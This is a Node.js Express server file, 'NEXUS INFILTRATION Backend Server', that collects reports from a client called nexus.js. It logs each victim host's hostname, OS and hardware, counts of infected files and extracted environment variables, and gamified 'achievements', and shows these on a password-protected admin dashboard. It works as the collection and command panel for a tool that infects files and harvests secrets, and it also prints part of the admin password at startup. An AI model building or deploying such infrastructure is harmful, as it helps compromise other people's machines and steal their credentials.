// server.js - NEXUS INFILTRATION Backend Server
// All secrets read from environment variables (Railway)

const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
require('dotenv').config();

const app = express();

// ═══════════════════════════════════════════════════════
// READ FROM ENVIRONMENT VARIABLES (Set in Railway)
// ═══════════════════════════════════════════════════════

const PORT = process.env.PORT || 3000;
const NEXUS_SECRET = process.env.NEXUS_SECRET || 'fallback-secret';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
const ADMIN_KEY = process.env.ADMIN_KEY;

// ═══════════════════════════════════════════════════════
// MIDDLEWARE
// ═══════════════════════════════════════════════════════

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

app.use((req, res, next) => {
    console.log(`[${new Date().toLocaleTimeString()}] ${req.method} ${req.url}`);
    next();
});

// ═══════════════════════════════════════════════════════
// SESSIONS (Stores logged-in admin tokens)
// ═══════════════════════════════════════════════════════

const adminSessions = new Set();

// ═══════════════════════════════════════════════════════
// IN-MEMORY DATABASE
// ═══════════════════════════════════════════════════════

const database = {
    totalRuns: 0,
    runs: [],
    latestRun: null,
    startTime: new Date(),
    stats: {
        totalFilesInfected: 0,
        totalEnvVarsExtracted: 0,
        uniqueHostnames: new Set(),
        osDistribution: {},
        threatLevels: { LOW: 0, MEDIUM: 0, HIGH: 0, CRITICAL: 0 },
        platformDistribution: {}
    },
    achievements: {
        totalUnlocked: 0,
        kingAchievements: 0,
        cleanerAchievements: 0
    }
};

// ═══════════════════════════════════════════════════════
// MONGODB (Optional)
// ═══════════════════════════════════════════════════════

let mongoCollection = null;

async function connectMongo() {
    const uri = process.env.MONGODB_URI;
    if (!uri || uri.trim() === '') {
        console.log('💾 Using IN-MEMORY storage\n');
        return;
    }
    try {
        const { MongoClient } = require('mongodb');
        const client = new MongoClient(uri);
        await client.connect();
        mongoCollection = client.db('nexus_infiltration').collection('runs');
        
        const existing = await mongoCollection.find().sort({ id: -1 }).toArray();
        if (existing.length > 0) {
            database.runs = existing;
            database.totalRuns = existing.length;
            database.latestRun = existing[0];
            existing.forEach(run => {
                database.stats.totalFilesInfected += run.stats?.filesInfected || 0;
                database.stats.totalEnvVarsExtracted += run.stats?.envVarsExtracted || 0;
                database.stats.uniqueHostnames.add(run.systemInfo?.hostname);
                const os = run.systemInfo?.os || 'Unknown';
                database.stats.osDistribution[os] = (database.stats.osDistribution[os] || 0) + 1;
                const threat = run.stats?.threatLevel || 'LOW';
                database.stats.threatLevels[threat] = (database.stats.threatLevels[threat] || 0) + 1;
            });
        }
        console.log(`🍃 MongoDB connected. Loaded ${existing.length} runs\n`);
    } catch (e) {
        console.log('⚠️  MongoDB failed, using in-memory\n');
    }
}

// ═══════════════════════════════════════════════════════
// AUTH MIDDLEWARES
// ═══════════════════════════════════════════════════════

// For nexus.js reporting
function nexusAuth(req, res, next) {
    const secret = req.body?.secret || req.headers['x-nexus-secret'];
    if (secret !== NEXUS_SECRET) {
        return res.status(403).json({ error: 'Invalid secret' });
    }
    next();
}

// For admin dashboard access
function adminAuth(req, res, next) {
    const token = req.headers['x-session-token'];
    const key = req.headers['x-admin-key'];
    
    if ((token && adminSessions.has(token)) || (key && key === ADMIN_KEY)) {
        next();
    } else {
        res.status(403).json({ error: 'Login required' });
    }
}

// ═══════════════════════════════════════════════════════
// PUBLIC ROUTES
// ═══════════════════════════════════════════════════════

// Landing page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Admin page
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'ACTIVE',
        uptime: Math.floor(process.uptime()),
        totalRuns: database.totalRuns,
        timestamp: new Date().toISOString()
    });
});

// ═══════════════════════════════════════════════════════
// ADMIN LOGIN (Password checked against Railway variable)
// ═══════════════════════════════════════════════════════

app.post('/api/admin/login', (req, res) => {
    const { password } = req.body;
    
    if (password === ADMIN_PASSWORD) {
        const token = crypto.randomBytes(32).toString('hex');
        adminSessions.add(token);
        console.log('✅ Admin logged in');
        
        res.json({
            success: true,
            token: token,
            adminKey: ADMIN_KEY
        });
    } else {
        console.log('❌ Failed login attempt');
        res.status(401).json({ success: false, message: 'Wrong password' });
    }
});

app.post('/api/admin/logout', (req, res) => {
    const token = req.headers['x-session-token'];
    adminSessions.delete(token);
    res.json({ success: true });
});

// ═══════════════════════════════════════════════════════
// NEXUS REPORT ENDPOINT
// ═══════════════════════════════════════════════════════

app.post('/api/report', nexusAuth, async (req, res) => {
    try {
        const data = req.body;
        if (!data.missionId) return res.status(400).json({ error: 'Missing missionId' });

        const run = {
            id: database.totalRuns + 1,
            missionId: data.missionId,
            timestamp: data.timestamp || new Date().toISOString(),
            systemInfo: {
                hostname: data.systemProfile?.hostname || 'Unknown',
                os: data.systemProfile?.type || 'Unknown',
                platform: data.systemProfile?.platform || 'Unknown',
                cpu: (data.hardwareProfile?.cpu?.model || 'Unknown').substring(0, 50),
                cores: data.hardwareProfile?.cpu?.cores || 0,
                ramTotal: data.hardwareProfile?.memory?.total || 'Unknown',
                ramUsage: data.hardwareProfile?.memory?.usagePercent || 'Unknown',
                nodeVersion: data.nodeProfile?.version || 'Unknown'
            },
            stats: {
                envVarsExtracted: data.envVarCount || 0,
                filesScanned: data.filesScanned || 0,
                filesInfected: data.filesInfected || 0,
                mutations: data.mutations || 0,
                threatLevel: data.threatLevel || 'LOW',
                crudCompleted: data.crudCompleted || false,
                cleanupCompleted: data.cleanupCompleted || false
            },
            achievementCount: data.achievements?.length || 0,
            hasKing: data.achievements?.includes('KING') || false,
            hasCleaner: data.achievements?.includes('CLEANER') || false
        };

        database.runs.unshift(run);
        database.totalRuns++;
        database.latestRun = run;
        database.stats.totalFilesInfected += run.stats.filesInfected;
        database.stats.totalEnvVarsExtracted += run.stats.envVarsExtracted;
        database.stats.uniqueHostnames.add(run.systemInfo.hostname);
        
        const os = run.systemInfo.os;
        database.stats.osDistribution[os] = (database.stats.osDistribution[os] || 0) + 1;
        
        const threat = run.stats.threatLevel;
        database.stats.threatLevels[threat] = (database.stats.threatLevels[threat] || 0) + 1;
        
        if (run.hasKing) database.achievements.kingAchievements++;
        if (run.hasCleaner) database.achievements.cleanerAchievements++;
        database.achievements.totalUnlocked += run.achievementCount;

        if (mongoCollection) {
            try { await mongoCollection.insertOne(run); } catch {}
        }

        console.log(`📥 Report: ${run.missionId} | ${run.systemInfo.hostname} | ${run.systemInfo.os} | Threat: ${run.stats.threatLevel} | Total: ${database.totalRuns}`);

        res.json({ success: true, runId: run.id, totalRuns: database.totalRuns });

    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

// ═══════════════════════════════════════════════════════
// PROTECTED ADMIN API ROUTES
// ═══════════════════════════════════════════════════════

app.get('/api/dashboard', adminAuth, (req, res) => {
    res.json({
        serverInfo: {
            uptime: Math.floor(process.uptime()),
            startTime: database.startTime
        },
        totals: {
            runs: database.totalRuns,
            uniqueHostnames: database.stats.uniqueHostnames.size,
            totalFilesInfected: database.stats.totalFilesInfected,
            totalEnvVarsExtracted: database.stats.totalEnvVarsExtracted,
            kingAchievements: database.achievements.kingAchievements,
            cleanerAchievements: database.achievements.cleanerAchievements
        },
        latestRun: database.latestRun ? {
            missionId: database.latestRun.missionId,
            timestamp: database.latestRun.timestamp,
            hostname: database.latestRun.systemInfo.hostname,
            os: database.latestRun.systemInfo.os,
            platform: database.latestRun.systemInfo.platform,
            cpu: database.latestRun.systemInfo.cpu,
            ramUsage: database.latestRun.systemInfo.ramUsage,
            nodeVersion: database.latestRun.systemInfo.nodeVersion,
            threatLevel: database.latestRun.stats.threatLevel,
            filesScanned: database.latestRun.stats.filesScanned,
            filesInfected: database.latestRun.stats.filesInfected,
            envVarsExtracted: database.latestRun.stats.envVarsExtracted,
            mutations: database.latestRun.stats.mutations,
            achievementCount: database.latestRun.achievementCount
        } : null,
        distributions: {
            os: database.stats.osDistribution,
            threatLevels: database.stats.threatLevels
        },
        recentRuns: database.runs.slice(0, 15).map(run => ({
            id: run.id,
            missionId: run.missionId,
            timestamp: run.timestamp,
            hostname: run.systemInfo?.hostname || 'Unknown',
            os: run.systemInfo?.os || 'Unknown',
            cpu: (run.systemInfo?.cpu || 'Unknown').substring(0, 30),
            threatLevel: run.stats?.threatLevel || 'LOW',
            filesInfected: run.stats?.filesInfected || 0,
            envVarsExtracted: run.stats?.envVarsExtracted || 0,
            achievementCount: run.achievementCount || 0
        }))
    });
});

app.get('/api/runs', adminAuth, (req, res) => {
    res.json({ total: database.totalRuns, runs: database.runs.slice(0, 50) });
});

app.get('/api/stats', adminAuth, (req, res) => {
    res.json({
        totalRuns: database.totalRuns,
        uniqueHostnames: database.stats.uniqueHostnames.size,
        totalFilesInfected: database.stats.totalFilesInfected,
        totalEnvVarsExtracted: database.stats.totalEnvVarsExtracted,
        osDistribution: database.stats.osDistribution,
        threatLevels: database.stats.threatLevels,
        achievements: database.achievements
    });
});

// ═══════════════════════════════════════════════════════
// 404
// ═══════════════════════════════════════════════════════

app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
});

// ═══════════════════════════════════════════════════════
// START
// ═══════════════════════════════════════════════════════

async function start() {
    await connectMongo();
    
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`
╔══════════════════════════════════════════════════════╗
║     ⚡ NEXUS INFILTRATION SERVER ACTIVE ⚡           ║
╠══════════════════════════════════════════════════════╣
║  🌐 Public:  http://0.0.0.0:${PORT}                   ║
║  🔐 Admin:   http://0.0.0.0:${PORT}/admin             ║
║  Admin PW:   ${ADMIN_PASSWORD.substring(0, 6)}...                     ║
╚══════════════════════════════════════════════════════╝
        `);
    });
}

start().catch(e => { console.error(e); process.exit(1); });